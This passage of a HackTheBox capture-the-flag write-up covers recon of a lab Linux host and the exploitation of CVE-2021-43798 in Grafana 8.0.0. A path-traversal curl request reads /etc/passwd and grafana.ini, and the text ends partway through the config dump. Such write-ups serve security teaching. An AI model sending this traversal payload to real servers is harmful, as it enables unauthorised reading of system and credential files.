---
title: HTB: Data
url: https://0xdf.gitlab.io/2025/07/01/htb-data.html
date: 2025-07-01T09:00:00+00:00
difficulty: Easy [20]
os: Linux
tags: htb-data, hackthebox, ctf, nmap, vulnlabs, grafana, cve-2021-43798, directory-traversal, file-read, htb-ambassador, htb-bigbang, grafana2hashcat, docker, docker-exec, mount, docker-privileged
---

![Data](/img/data-cover.png)

Data is a pretty straight forward easy box that starts with a Grafana instance. I’ll abuse an unauthenticated directory traversal / file read vulnerability to leak the SQLite file used by Grafana. I’ll crack a user hash and find it’s a shared password with an account on the system. For root, I’ll abuse a sudo rule that allows for running docker exec. Inside the container, I’ll mount the host file system and leverage that into a shell.

## Box Info

| Name | [Data](https://hackthebox.com/machines/data)  [Data](https://hackthebox.com/machines/data) [Play on HackTheBox](https://hackthebox.com/machines/data) |
| --- | --- |
| Release Date | 01 Jul 2025 |
| Retire Date | 01 Jul 2025 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| First Blood User | N/A (non-competitive) |
| First Blood Root | N/A (non-competitive) |
| Creator | [xct xct](https://app.hackthebox.com/users/13569) |

## Recon

### Initial Scanning

`nmap` finds two open TCP ports, SSH (22) and HTTP (3000):

```

oxdf@hacky$ nmap -p- -vvv -min-rate 10000 10.129.234.47
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-16 01:04 UTC
...[snip]...
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
3000/tcp open  ppp     syn-ack ttl 62

Nmap done: 1 IP address (1 host up) scanned in 6.84 seconds
oxdf@hacky$ nmap -p 22,3000 -sCV 10.129.234.47
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-16 01:06 UTC
Nmap scan report for 10.129.234.47
Host is up (0.090s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 63:47:0a:81:ad:0f:78:07:46:4b:15:52:4a:4d:1e:39 (RSA)
|   256 7d:a9:ac:fa:01:e8:dd:09:90:40:48:ec:dd:f3:08:be (ECDSA)
|_  256 91:33:2d:1a:81:87:1a:84:d3:b9:0b:23:23:3d:19:4b (ED25519)
3000/tcp open  ppp?
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Mon, 16 Jun 2025 01:19:20 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Mon, 16 Jun 2025 01:18:44 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   HTTPOptions:
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Mon, 16 Jun 2025 01:18:50 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.94SVN%I=7%D=6/16%Time=684F6E06%P=x86_64-pc-linux-gnu%r
SF:(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
SF:d\x20Request")%r(GetRequest,174,"HTTP/1\.0\x20302\x20Found\r\nCache-Con
SF:trol:\x20no-cache\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nEx
SF:pires:\x20-1\r\nLocation:\x20/login\r\nPragma:\x20no-cache\r\nSet-Cooki
SF:e:\x20redirect_to=%2F;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-Con
SF:tent-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-Prot
SF:ection:\x201;\x20mode=block\r\nDate:\x20Mon,\x2016\x20Jun\x202025\x2001
SF::18:44\x20GMT\r\nContent-Length:\x2029\r\n\r\n<a\x20href=\"/login\">Fou
SF:nd</a>\.\n\n")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent
SF:-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n4
SF:00\x20Bad\x20Request")%r(HTTPOptions,12E,"HTTP/1\.0\x20302\x20Found\r\n
SF:Cache-Control:\x20no-cache\r\nExpires:\x20-1\r\nLocation:\x20/login\r\n
SF:Pragma:\x20no-cache\r\nSet-Cookie:\x20redirect_to=%2F;\x20Path=/;\x20Ht
SF:tpOnly;\x20SameSite=Lax\r\nX-Content-Type-Options:\x20nosniff\r\nX-Fram
SF:e-Options:\x20deny\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x2
SF:0Mon,\x2016\x20Jun\x202025\x2001:18:50\x20GMT\r\nContent-Length:\x200\r
SF:\n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConten
SF:t-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n
SF:400\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20
SF:Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:
SF:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTT
SF:P/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20char
SF:set=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSS
SF:essionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
SF:0Request")%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent
SF:-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n4
SF:00\x20Bad\x20Request")%r(FourOhFourRequest,1A1,"HTTP/1\.0\x20302\x20Fou
SF:nd\r\nCache-Control:\x20no-cache\r\nContent-Type:\x20text/html;\x20char
SF:set=utf-8\r\nExpires:\x20-1\r\nLocation:\x20/login\r\nPragma:\x20no-cac
SF:he\r\nSet-Cookie:\x20redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity\.
SF:txt%252ebak;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-Content-Type-
SF:Options:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-Protection:\x2
SF:01;\x20mode=block\r\nDate:\x20Mon,\x2016\x20Jun\x202025\x2001:19:20\x20
SF:GMT\r\nContent-Length:\x2029\r\n\r\n<a\x20href=\"/login\">Found</a>\.\n
SF:\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 102.51 seconds

```

Based on the [OpenSSH](/cheatsheets/os#ubuntu) version, the host is likely running Ubuntu 18.04 bionic.

`nmap` is showing one additional hop to get to the webserver. `lft` confirms this:

```

oxdf@hacky$ sudo lft 10.129.234.47:22
Tracing ......T
TTL LFT trace to 10.129.234.47:22/tcp
 1  10.10.14.1 89.6ms
 2  [target open] 10.129.234.47:22 89.6ms
oxdf@hacky$ sudo lft 10.129.234.47:3000
Tracing ......T
TTL LFT trace to 10.129.234.47:3000/tcp
 1  10.10.14.1 89.6ms
 2  10.129.234.47 89.8ms
 3  [target open] 10.129.234.47:3000 89.3ms

```

That implies the webserver is running in a container.

### Website - TCP 3000

#### Site

The website is an instance of Grafana:

![image-20250615210722048](/img/image-20250615210722048.png)

#### Tech Stack

The login page footer gives the version of v8.0.0. The HTTP response headers don’t reveal much else:

```

HTTP/1.1 302 Found
Cache-Control: no-cache
Content-Type: text/html; charset=utf-8
Expires: -1
Location: /login
Pragma: no-cache
Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
X-Content-Type-Options: nosniff
X-Frame-Options: deny
X-Xss-Protection: 1; mode=block
Date: Mon, 16 Jun 2025 01:22:28 GMT
Content-Length: 29

```

Grafana is a TypeScript front-end with a Go backend, as seen on it’s [GitHub page](https://github.com/grafana/grafana).

There is no 404 page, as it just redirects to `/login`. I’ll skip the directory brute force as the routes in Grafana are documented.

## Shell as boris

### Exfil Grafana DB

#### CVE-2021-43798 Background

Searching for “grafana v8.0.0 cve” returns references to a couple CVEs, including references to CVE-2021-43798:

![image-20250616065525985](/img/image-20250616065525985.png)

[CVE-2021-43798](https://nvd.nist.gov/vuln/detail/cve-2021-43798) is described by Nist as:

> Grafana is an open-source platform for monitoring and observability. Grafana versions 8.0.0-beta1 through 8.3.0 (except for patched versions) iss vulnerable to directory traversal, allowing access to local files. The vulnerable URL path is: `<grafana_host_url>/public/plugins/<plugin ID>/`, where is the plugin ID for any installed plugin. At no time has Grafana Cloud been vulnerable. Users are advised to upgrade to patched versions 8.0.7, 8.1.8, 8.2.7, or 8.3.1. The GitHub Security Advisory contains more information about vulnerable URL paths, mitigation, and the disclosure timeline.

I’ve exploited this vulnerability before on Ambassador, and in that post I [walk through a POC exploit](/2023/01/28/htb-ambassador.html#exploit-analysis) to show what it’s doing. The plugins path is vulnerable to directory traversal leading to file read in the path `/public/plugins/<plugin name>/`.

#### CVE-2021-43798 POC

To test this, I’ll try to read `/etc/passwd`:

```

oxdf@hacky$ curl --path-as-is http://10.129.234.47:3000/public/plugins/alertlist/../../../../../../../../etc/passwd
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
grafana:x:472:0:Linux User,,,:/home/grafana:/sbin/nologin

```

It works.

#### Enumerate Grafana

Just like in Ambassador, I’ll read the `grafana.ini` file:

```

oxdf@hacky$ curl --path-as-is http://10.129.234.47:3000/public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini
##################### Grafana Configuration Example #####################
#
# Everything has defaults so you only need to uncomment things you want to
# change

# possible values : production, development
;app_mode = production

# instance name, defaults to HOSTNAME environment variable value or hostname if HOSTNAME var is empty
;instance_name = ${HOSTNAME}

#################################### Paths ####################################
[paths]
# Path to where grafana can store temp files, sessions, and the sqlite3 db (if that is used)
;data = /var/lib/grafana

# Temporary files in `data` directory older than given duration will be removed
;temp_data_lifetime = 24h

# Directory where grafana can store logs
;logs = /var/log/grafana

# Directory where grafana will automatically scan and look for plugins
;plugins = /var/lib/grafana/plugins

# folder that contains provisioning config files that grafana will apply on startup and while running.
;provisioning = conf/provisioning

#################################### Server ####################################
[server]
# Protocol (http, https, h2, socket)
;protocol = http

# The ip address to bind to, empty will bind to all interfaces
;http_addr =

# The http port  to use
;http_port = 3000

# The public facing domain name used to access grafana from a browser
;domain = localhost

# Redirect to correct domain if host header does not match domain
# Prevents DNS rebinding attacks
;enforce_domain = false

# The full public facing url you use in browser, used for redirects and emails
# If you use reverse proxy and sub path specify full url (with sub path)
;root_url = %(protocol)s://%(domain)s:%(http_port)s/

# Serve Grafana from subpath specified in `root_url` setting. By default it is set to `false` for compatibility reasons.
;serve_from_sub_path = false

# Log web requests
;router_logging = false

# the path relative working path
;static_root_path = public

# enable gzip
;enable_gzip = false

# https certs & key file
;cert_file =
;cert_key =

# Unix socket path
;socket =

# CDN Url
;cdn_url =

# Sets the maximum time using a duration format (5s/5m/5ms) before timing out read of an incoming request and closing idle connections.
# `0` means there is no timeout for reading the request.
;read_timeout = 0

#################################### Database ####################################
[database]
# You can configure the database connection by specifying type, host, name, user and password
# as separate properties or as on string using the url properties.

# Either "mysql", "postgres" or "sqlite3", it's your choice
;type = sqlite3
;host = 127.0.0.1:3306
;name = grafana
;user = root
# If the password contains # or ; you have to wrap it with triple quotes. Ex """#password;"""
;password =

# Use either URL or the previous fields to configure the database
# Example: mysql://user:secret@host:port/database
;url =

# For "postgres" only, either "disable", "require" or "verify-full"
;ssl_mode = disable

# Database drivers may support different transaction isolation levels.
# Currently, only "mysql" driver supports isolation levels.
# If the value is empty - driver's default isolation level is applied.
# For "mysql" use "READ-UNCOMMITTED", "READ-COMMITTED", "REPEATABLE-READ" or "SERIALIZABLE".
;isolation_level =

;ca_cert_path =
;client_key_path =
;client_cert_path =
;server_cert_name =

# For "sqlite3" only, path relative to data_path setting
;path = grafana.db

# Max idle conn setting default is 2
;max_idle_conn = 2

# Max conn setting default is 0 (mean not set)
;max_open_conn =

# Connection Max Lifetime default is 14400 (means 14400 seconds or 4 hours)
;conn_max_lifetime = 14400

# Set to true to log the sql calls and execution times.
;log_queries =

# For "sqlite3" only. cache mode setting used for connecting to the database. (private, shared)
;cache_mode = private

################################### Data sources #########################
[datasources]
# Upper limit of data sources that Grafana will return. This limit is a temporary configuration and it will be deprecated when pagination will be introduced on the list data sources API.
;datasource_limit = 5000

#################################### Cache server #############################
[remote_cache]
# Either "redis", "memcached" or "database" default is "database"
;type = database

# cache connectionstring options
# database: will use Grafana primary database.
# redis: config like redis server e.g. `addr=127.0.0.1:6379,pool_size=100,db=0,ssl=false`. Only addr is required. ssl may be 'true', 'false', or 'insecure'.
# memcache: 127.0.0.1:11211
;connstr =

#################################### Data proxy ###########################
[dataproxy]

# This enables data proxy logging, default is false
;logging = false

# How long the data proxy waits to read the headers of the response before timing out, default is 30 seconds.
# This setting also applies to core backend HTTP data sources where query requests use an HTTP client with timeout set.
;timeout = 30

# How long the data proxy waits to establish a TCP connection before timing out, default is 10 seconds.
;dialTimeout = 10

# How many seconds the data proxy waits before sending a keepalive probe request.
;keep_alive_seconds = 30

# How many seconds the data proxy waits for a successful TLS Handshake before timing out.
;tls_handshake_timeout_seconds = 10

# How many seconds the data proxy will wait for a server's first response headers after
# fully writing the request headers if the request has an "Expect: 100-continue"
# header. A value of 0 will result in the body being sent immediately, without
# waiting for the server to approve.
;expect_continue_timeout_seconds = 1

# The maximum number of idle connections that Grafana will keep alive.
;max_idle_connections = 100

# The maximum number of idle connections per host that Grafana will keep alive.
;max_idle_connections_per_host = 2

# How many seconds the data proxy keeps an idle connection open before timing out.
;idle_conn_timeout_seconds = 90

# If enabled and user is not anonymous, data proxy will add X-Grafana-User header with username into the request, default is false.
;send_user_header = false

#################################### Analytics ####################################
[analytics]
# Server reporting, sends usage counters to stats.grafana.org every 24 hours.
# No ip addresses are being tracked, only simple counters to track
# running instances, dashboard and error counts. It is very helpful to us.
# Change this option to false to disable reporting.
;reporting_enabled = true

# The name of the distributor of the Grafana instance. Ex hosted-grafana, grafana-labs
;reporting_distributor = grafana-labs

# Set to false to disable all checks to https://grafana.net
# for new versions (grafana itself and plugins), check is used
# in some UI views to notify that grafana or plugin update exists
# This option does not cause any auto updates, nor send any information
# only a GET request to http://grafana.com to get latest versions
;check_for_updates = true

# Google Analytics universal tracking code, only enabled if you specify an id here
;google_analytics_ua_id =

# Google Tag Manager ID, only enabled if you specify an id here
;google_tag_manager_id =

#################################### Security ####################################
[security]
# disable creation of admin user on first start of grafana
;disable_initial_admin_creation = false

# default admin user, created on startup
;admin_user = admin

# default admin password, can be changed before first start of grafana,  or in profile settings
;admin_password = admin

# used for signing
;secret_key = SW2YcwTIb9zpOOhoPsMm

# disable gravatar profile images
;disable_gravatar = false

# data source proxy whitelist (ip_or_domain:port separated by spaces)
;data_source_proxy_whitelist =

# disable protection against brute force login attempts
;disable_brute_force_login_protection = false

# set to true if you host Grafana behind HTTPS. default is false.
;cookie_secure = false

# set cookie SameSite attribute. defaults to `lax`. can be set to "lax", "strict", "none" and "disabled"
;cookie_samesite = lax

# set to true if you want to allow browsers to render Grafana in a <frame>, <iframe>, <embed> or <object>. default is false.
;allow_embedding = false

# Set to true if you want to enable http strict transport security (HSTS) response header.
# This is only sent when HTTPS is enabled in this configuration.
# HSTS tells browsers that the site should only be accessed using HTTPS.
;strict_transport_security = false

# Sets how long a browser should cache HSTS. Only applied if strict_transport_security is enabled.
;strict_transport_security_max_age_seconds = 86400

# Set to true if to enable HSTS preloading option. Only applied if strict_transport_security is enabled.
;strict_transport_security_preload = false

# Set to true if to enable the HSTS includeSubDomains option. Only applied if strict_transport_security is enabled.
;strict_transport_security_subdomains = false

# Set to true to enable the X-Content-Type-Options response header.
# The X-Content-Type-Options response HTTP header is a marker used by the server to indicate that the MIME types advertised
# in the Content-Type headers should not be changed and be followed.
;x_content_type_options = true

# Set to true to enable the X-XSS-Protection header, which tells browsers to stop pages from loading
# when they detect reflected cross-site scripting (XSS) attacks.
;x_xss_protection = true

# Enable adding the Content-Security-Policy header to your requests.
# CSP allows to control resources the user agent is allowed to load and helps prevent XSS attacks.
;content_security_policy = false

# Set Content Security Policy template used when adding the Content-Security-Policy header to your requests.
# $NONCE in the template includes a random nonce.
# $ROOT_PATH is server.root_url without the protocol.
;content_security_policy_template = """script-src 'self' 'unsafe-eval' 'unsafe-inline' 'strict-dynamic' $NONCE;object-src 'none';font-src 'self';style-src 'self' 'unsafe-inline' blob:;img-src * data:;base-uri 'self';connect-src 'self' grafana.com ws://$ROOT_PATH wss://$ROOT_PATH;manifest-src 'self';media-src 'none';form-action 'self';"""

#################################### Snapshots ###########################
[snapshots]
# snapshot sharing options
;external_enabled = true
;external_snapshot_url = https://snapshots-origin.raintank.io
;external_snapshot_name = Publish to snapshot.raintank.io

# Set to true to enable this Grafana instance act as an external snapshot server and allow unauthenticated requests for
# creating and deleting snapshots.
;public_mode = false

# remove expired snapshot
;snapshot_remove_expired = true

#################################### Dashboards History ##################
[dashboards]
# Number dashboard versions to keep (per dashboard). Default: 20, Minimum: 1
;versions_to_keep = 20

# Minimum dashboard refresh interval. When set, this will restrict users to set the refresh interval of a dashboard lower than given interval. Per default this is 5 seconds.
# The interval string is a possibly signed sequence of decimal numbers, followed by a unit suffix (ms, s, m, h, d), e.g. 30s or 1m.
;min_refresh_interval = 5s

# Path to the default home dashboard. If this value is empty, then Grafana uses StaticRootPath + "dashboards/home.json"
;default_home_dashboard_path =

#################################### Users ###############################
[users]
# disable user signup / registration
;allow_sign_up = true

# Allow non admin users to create organizations
;allow_org_create = true

# Set to true to automatically assign new users to the default organization (id 1)
;auto_assign_org = true

# Set this value to automatically add new users to the provided organization (if auto_assign_org above is set to true)
;auto_assign_org_id = 1

# Default role new users will be automatically assigned (if disabled above is set to true)
;auto_assign_org_role = Viewer

# Require email validation before sign up completes
;verify_email_enabled = false

# Background text for the user field on the login page
;login_hint = email or username
;password_hint = password

# Default UI theme ("dark" or "light")
;default_theme = dark

# Path to a custom home page. Users are only redirected to this if the default home dashboard is used. It should match a frontend route and contain a leading slash.
; home_page =

# External user management, these options affect the organization users view
;external_manage_link_url =
;external_manage_link_name =
;external_manage_info =

# Viewers can edit/inspect dashboard settings in the browser. But not save the dashboard.
;viewers_can_edit = false

# Editors can administrate dashboard, folders and teams they create
;editors_can_admin = false

# The duration in time a user invitation remains valid before expiring. This setting should be expressed as a duration. Examples: 6h (hours), 2d (days), 1w (week). Default is 24h (24 hours). The minimum supported duration is 15m (15 minutes).
;user_invite_max_lifetime_duration = 24h

# Enter a comma-separated list of users login to hide them in the Grafana UI. These users are shown to Grafana admins and themselves.
; hidden_users =

[auth]
# Login cookie name
;login_cookie_name = grafana_session

# The maximum lifetime (duration) an authenticated user can be inactive before being required to login at next visit. Default is 7 days (7d). This setting should be expressed as a duration, e.g. 5m (minutes), 6h (hours), 10d (days), 2w (weeks), 1M (month). The lifetime resets at each successful token rotation.
;login_maximum_inactive_lifetime_duration =

# The maximum lifetime (duration) an authenticated user can be logged in since login time before being required to login. Default is 30 days (30d). This setting should be expressed as a duration, e.g. 5m (minutes), 6h (hours), 10d (days), 2w (weeks), 1M (month).
;login_maximum_lifetime_duration =

# How often should auth tokens be rotated for authenticated users when being active. The default is each 10 minutes.
;token_rotation_interval_minutes = 10

# Set to true to disable (hide) the login form, useful if you use OAuth, defaults to false
;disable_login_form = false

# Set to true to disable the sign out link in the side menu. Useful if you use auth.proxy or auth.jwt, defaults to false
;disable_signout_menu = false

# URL to redirect the user to after sign out
;signout_redirect_url =

# Set to true to attempt login with OAuth automatically, skipping the login screen.
# This setting is ignored if multiple OAuth providers are configured.
;oauth_auto_login = false

# OAuth state max age cookie duration in seconds. Defaults to 600 seconds.
;oauth_state_cookie_max_age = 600

# limit of api_key seconds to live before expiration
;api_key_max_seconds_to_live = -1

# Set to true to enable SigV4 authentication option for HTTP-based datasources.
;sigv4_auth_enabled = false

#################################### Anonymous Auth ######################
[auth.anonymous]
# enable anonymous access
;enabled = false

# specify organization name that should be used for unauthenticated users
;org_name = Main Org.

# specify role for unauthenticated users
;org_role = Viewer

# mask the Grafana version number for unauthenticated users
;hide_version = false

#################################### GitHub Auth ##########################
[auth.github]
;enabled = false
;allow_sign_up = true
;client_id = some_id
;client_secret = some_secret
;scopes = user:email,read:org
;auth_url = https://github.com/login/oauth/authorize
;token_url = https://github.com/login/oauth/access_token
;api_url = https://api.github.com/user
;allowed_domains =
;team_ids =
;allowed_organizations =

#################################### GitLab Auth #########################
[auth.gitlab]
;enabled = false
;allow_sign_up = true
;client_id = some_id
;client_secret = some_secret
;scopes = api
;auth_url = https://gitlab.com/oauth/authorize
;token_url = https://gitlab.com/oauth/token
;api_url = https://gitlab.com/api/v4
;allowed_domains =
;allowed_groups =

#################################### Google Auth ##########################
[auth.google]
;enabled = false
;allow_sign_up = true
;client_id = some_client_id
;client_secret = some_client_secret
;scopes = https://www.googleapis.com/auth/userinfo.profile https://www.googleapis.com/auth/userinfo.email
;auth_url = https://accounts.google.com/o/oauth2/auth
;token_url = https://accounts.google.com/o/oauth2/token
;api_url = https://www.googleapis.com/oauth2/v1/userinfo
;allowed_domains =
;hosted_domain =

#################################### Grafana.com Auth ####################
[auth.grafana_com]
;enabled = false
;allow_sign_up = true
;client_id = some_id
;client_secret = some_secret
;scopes = user:email
;allowed_organizations =

#################################### Azure AD OAuth #######################
[auth.azuread]
;name = Azure AD
;enabled = false
;allow_sign_up = true
;client_id = some_client_id
;client_secret = some_client_secret
;scopes = openid email profile
;auth_url = https://login.microsoftonline.com/<tenant-id>/oauth2/v2.0/authorize
;token_url = https://login.microsoftonline.com/<tenant-id>/oauth2/v2.0/token
;allowed_domains =
;allowed_groups =

#################################### Okta OAuth #######################
[auth.okta]
;name = Okta
;enabled = false
;allow_sign_up = true
;client_id = some_id
;client_secret = some_secret
;scopes = openid profile email groups
;auth_url = https://<tenant-id>.okta.com/oauth2/v1/authorize
;token_url = https://<tenant-id>.okta.com/oauth2/v1/token
;api_url = https://<tenant-id>.okta.com/oauth2/v1/userinfo
;allowed_domains =
;allowed_groups =
;role_attribute_path =
;role_attribute_strict = false

#################################### Generic OAuth ##########################
[auth.generic_oauth]
;enabled = false
;name = OAuth
;allow_sign_up = true
;client_id = some_id
;client_secret = some_secret
;scopes = user:email,read:org
;empty_scopes = false
;email_attribute_name = email:primary
;email_attribute_path =
;login_attribute_path =
;name_attribute_path =
;id_token_attribute_name =
;auth_url = https://foo.bar/login/oauth/authorize
;token_url = https://foo.bar/login/oauth/access_token
;api_url = https://foo.bar/user
;allowed_domains =
;team_ids =
;allowed_organizations =
;role_attribute_path =
;role_attribute_strict = false
;tls_skip_verify_insecure = false
;tls_client_cert =
;tls_client_key =
;tls_client_ca =

#################################### Basic Auth ##########################
[auth.basic]
;enabled = true

#################################### Auth Proxy ##########################
[auth.proxy]
;enabled = false
;header_name = X-WEBAUTH-USER
;header_property = username
;auto_sign_up = true
;sync_ttl = 60
;whitelist = 192.168.1.1, 192.168.2.1
;headers = Email:X-User-Email, Name:X-User-Name
# Read the auth proxy docs for details on what the setting below enables
;enable_login_token = false

#################################### Auth JWT ##########################
[auth.jwt]
;enabled = true
;header_name = X-JWT-Assertion
;email_claim = sub
;username_claim = sub
;jwk_set_url = https://foo.bar/.well-known/jwks.json
;jwk_set_file = /path/to/jwks.json
;cache_ttl = 60m
;expected_claims = {"aud": ["foo", "bar"]}
;key_file = /path/to/key/file

#################################### Auth LDAP ##########################
[auth.ldap]
;enabled = false
;config_file = /etc/grafana/ldap.toml
;allow_sign_up = true

# LDAP background sync (Enterprise only)
# At 1 am every day
;sync_cron = "0 0 1 * * *"
;active_sync_enabled = true

#################################### AWS ###########################
[aws]
# Enter a comma-separated list of allowed AWS authentication providers.
# Options are: default (AWS SDK Default), keys (Access && secret key), credentials (Credentials field), ec2_iam_role (EC2 IAM Role)
; allowed_auth_providers = default,keys,credentials

# Allow AWS users to assume a role using temporary security credentials.
# If true, assume role will be enabled for all AWS authentication providers that are specified in aws_auth_providers
; assume_role_enabled = true

#################################### Azure ###############################
[azure]
# Azure cloud environment where Grafana is hosted
# Possible values are AzureCloud, AzureChinaCloud, AzureUSGovernment and AzureGermanCloud
# Default value is AzureCloud (i.e. public cloud)
;cloud = AzureCloud

# Specifies whether Grafana hosted in Azure service with Managed Identity configured (e.g. Azure Virtual Machines instance)
# If enabled, the managed identity can be used for authentication of Grafana in Azure services
# Disabled by default, needs to be explicitly enabled
;managed_identity_enabled = false

# Client ID to use for user-assigned managed identity
# Should be set for user-assigned identity and should be empty for system-assigned identity
;managed_identity_client_id =

#################################### SMTP / Emailing ##########################
[smtp]
;enabled = false
;host = localhost:25
;user =
# If the password contains # or ; you have to wrap it with triple quotes. Ex """#password;"""
;password =
;cert_file =
;key_file =
;skip_verify = false
;from_address = admin@grafana.localhost
;from_name = Grafana
# EHLO identity in SMTP dialog (defaults to instance_name)
;ehlo_identity = dashboard.example.com
# SMTP startTLS policy (defaults to 'OpportunisticStartTLS')
;startTLS_policy = NoStartTLS

[emails]
;welcome_email_on_sign_up = false
;templates_pattern = emails/*.html

#################################### Logging ##########################
[log]
# Either "console", "file", "syslog". Default is console and  file
# Use space to separate multiple modes, e.g. "console file"
;mode = console file

# Either "debug", "info", "warn", "error", "critical", default is "info"
;level = info

# optional settings to set different levels for specific loggers. Ex filters = sqlstore:debug
;filters =

# For "console" mode only
[log.console]
;level =

# log line format, valid options are text, console and json
;format = console

# For "file" mode only
[log.file]
;level =

# log line format, valid options are text, console and json
;format = text

# This enables automated log rotate(switch of following options), default is true
;log_rotate = true

# Max line number of single file, default is 1000000
;max_lines = 1000000

# Max size shift of single file, default is 28 means 1 << 28, 256MB
;max_size_shift = 28

# Segment log daily, default is true
;daily_rotate = true

# Expired days of log file(delete after max days), default is 7
;max_days = 7

[log.syslog]
;level =

# log line format, valid options are text, console and json
;format = text

# Syslog network type and address. This can be udp, tcp, or unix. If left blank, the default unix endpoints will be used.
;network =
;address =

# Syslog facility. user, daemon and local0 through local7 are valid.
;facility =

# Syslog tag. By default, the process' argv[0] is used.
;tag =

[log.frontend]
# Should Sentry javascript agent be initialized
;enabled = false

# Sentry DSN if you want to send events to Sentry.
;sentry_dsn =

# Custom HTTP endpoint to send events captured by the Sentry agent to. Default will log the events to stdout.
;custom_endpoint = /log

# Rate of events to be reported between 0 (none) and 1 (all), float
;sample_rate = 1.0

# Requests per second limit enforced an extended period, for Grafana backend log ingestion endpoint (/log).
;log_endpoint_requests_per_second_limit = 3

# Max requests accepted per short interval of time for Grafana backend log ingestion endpoint (/log).
;log_endpoint_burst_limit = 15

#################################### Usage Quotas ########################
[quota]
; enabled = false

#### set quotas to -1 to make unlimited. ####
# limit number of users per Org.
; org_user = 10

